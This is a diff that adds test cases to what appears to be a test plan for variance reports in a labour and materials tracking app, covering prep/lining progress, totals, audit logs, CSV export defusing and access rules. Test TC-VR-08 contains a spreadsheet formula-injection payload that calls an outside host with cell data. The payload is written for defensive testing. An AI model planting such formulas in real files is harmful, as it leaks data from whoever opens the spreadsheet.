@@ -1336,6 +1336,90 @@ The fix is one cell — see the sync's reject message, which names it.
 
 ---
 
+## 14f. Variance reporting and the prep/lining split (Phase 6)
+
+> Added 2026-08-19 (branch `feat/phase7-reporting`). Rule 13.
+
+Four views over the same execution entries, in **Man-Hours & Labour**:
+HOD Approval Queue · Actual vs Benchmark · Reason Audit Log · Surface Prep
+Progress.
+
+### 14f.1 ⚠️ Surface prep is NOT lining progress
+
+| ID | Do this | Expected |
+|---|---|---|
+| **TC-VR-01** | Approve a **blasting** entry for 100 m² | `sme_surface_prep_progress.Done_SQM` gains 100. |
+| **TC-VR-02** | Check `sme_sqm_progress` for that equipment | **Unchanged.** Blasting a tank is not lining it. |
+| **TC-VR-03** | Approve a **lining** entry for 1,000 m² | `sme_sqm_progress.Done_SQM` gains 1,000, and surface prep gains nothing. |
+| **TC-VR-04** | Open Surface Prep Progress | Coverage is prep area ÷ the **equipment's own** area. |
+
+> `sme_sqm_progress.Done_SQM` drives Completion_Pct, SQM_Achievable_Now, the
+> shortfall and the buy list. Folding prep into it would report a vessel as
+> part-lined the moment it was cleaned. Coverage may legitimately exceed 100% —
+> a surface can be re-blasted, and clamping it would hide rework.
+>
+> The test is the entry's **own** stored system code (`''`), not a lookup, so an
+> entry opened as system-agnostic stays that way even if a recipe line for its
+> sub-activity is added tomorrow.
+
+### 14f.2 ⚠️ Totals sum absolutes — they never average percentages
+
+**TC-VR-05.** Post two entries: **2 m²** drawing 8 KG against a 4 KG benchmark
+(+100%), and **1,000 m²** drawing 2,000 KG against 2,000 KG (0%).
+
+* Correct total: 2,008 actual ÷ 2,004 benchmark = **+0.2%**
+* Averaging the two percentages gives **+50%**
+
+If the header reads +50%, the report is averaging — and a programme that is 8%
+over will report itself as on target.
+
+### 14f.3 The reason audit log
+
+| ID | Do this | Expected |
+|---|---|---|
+| **TC-VR-06** | As HOD, correct a quantity 8 → 5 with a justification | The log shows the justification **and** `8 → 5`. |
+| **TC-VR-07** | Read a row where nothing was corrected | `Changed` is blank; the supervisor's two reasons still appear. |
+
+> An audit line saying a quantity changed without saying from what is not an
+> audit trail — which is why `Original_Qty` / `Original_Headcount` /
+> `Original_Hours` are kept.
+
+### 14f.4 ⚠️ RULE 12 — the exports carry free text
+
+Every report exports through `reports.to_csv` / `to_xlsx`, which apply
+`_defuse` / `xl_val`. These reports carry `Material_Variance_Reason`,
+`Manpower_Variance_Reason` and `HOD_Edit_Justification` — **free text typed by
+a supervisor and opened in Excel by an HOD**, exactly the shape the rule exists
+for.
+
+| ID | Do this | Expected |
+|---|---|---|
+| **TC-VR-08** | Put `=HYPERLINK("https://x/?"&A1,"Open")` in a variance reason, export CSV | The cell arrives **apostrophe-prefixed**; Excel shows the text and evaluates nothing. |
+| **TC-VR-09** | Check a **negative** variance cell in the same export | **Not** prefixed. It must stay a number. |
+| **TC-VR-10** | Request `?format=exe` | 422. |
+
+> ⚠️ TC-VR-09 is the trap. Defusing `-5` would turn every negative subtotal into
+> text and silently zero it in a GRAND TOTAL. A string that *is* a number is
+> left alone; `-1+1` is not a number and **is** defused.
+>
+> Never hand rows to `csv.writer` or openpyxl directly in a new report.
+
+### 14f.5 Access
+
+| ID | Role | Expected |
+|---|---|---|
+| **TC-VR-11** | store keeper → `/execution/report/variance` | 403 |
+| **TC-VR-12** | supervisor → `/execution/report/reasons` | 403 — the audit log is the HOD's and the auditor's |
+| **TC-VR-13** | supervisor → `/execution/report/variance` | Allowed; they are accountable for these figures |
+
+### 14f.6 A `null` variance is not a zero variance
+
+**TC-VR-14** — a system-agnostic entry has no material benchmark. The material
+variance must read **n/a**, never a green 0%. "Cannot compare" and "matched
+perfectly" must never render the same.
+
+---
+
 ## 15. Do's and Don'ts
 
 ### Do
